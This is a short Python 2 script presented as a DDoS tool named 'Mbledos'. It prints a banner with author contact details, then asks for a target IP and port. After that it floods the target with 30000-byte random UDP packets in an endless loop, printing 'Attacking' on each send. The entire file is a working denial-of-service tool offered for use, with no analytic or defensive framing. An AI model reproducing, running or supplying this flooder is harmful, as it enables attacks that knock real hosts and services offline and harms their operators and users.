import time 

import datetime 

import socket 

import random 

import sys 

import os


os.system("clear")

os.system("figlet Mbledos")

time = time.ctime(time.time())

def main(): 
   
   print len(sys.argv) 
   
   if len(sys.argv) != 2: 
   
    print"\033[91m=========================================="
    print"\033[92mWELCOME TO  TOOLS DDOS MBLEDOS"
    print" "
    print"\033[92m[TOOLS INFORMATION]"
    print" "
    print"\033[92mReleased: 26 - 02 - 2019"
    print"\033[92mProgramming language: Python"
    print"\033[92mGitHub: https://github.com/RaphSoft/lain-lain.git"
    print"\033[91m=========================================="
    print" "
    print"\033[92mIf an error occurs in the program or bug"
    print"          \033[92mreport to:"
    print" "
    print"\033[92mFacebook: Om Telolet Om"
    print"\033[92mInstagram: yogadwiayudianto_34"
    print" "
    print("\033[94mTime now:") ,time
    print" "
    
    ip = raw_input ("\033[95mEnter you ip/host target:") 
    
    port = input ("Enter the port: ") 
    
    bytes = input ("Enter the  bytes/packet:")
 
 
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    
    bytes = random._urandom(30000) 
    
    sent = 0 
    
    while True: 
        
        sock.sendto(bytes, (ip, port)) 
        
        port = port + 0
        
        sent = sent + 1 
        
        print "\033[94mAttacking \033[91m%s \033[94mwith port \033[91m%s \033[94mbytes \033[91m%s"%(ip, port, sent)


if __name__ == '__main__': 
        
        main()
    
     
    
    

    
    
